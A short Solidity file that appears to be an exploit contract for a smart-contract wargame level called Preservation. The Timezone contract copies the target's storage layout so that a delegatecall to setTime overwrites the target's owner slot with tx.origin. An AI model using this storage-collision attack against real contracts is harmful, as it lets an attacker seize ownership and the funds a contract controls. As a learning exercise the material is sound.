// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Preservation {
    function setFirstTime(uint _timeStamp) external;
}

contract Timezone {
    address slot0;
    address slot1;
    address owner;

    function setTime(uint) public {
        owner = tx.origin;
    }
}
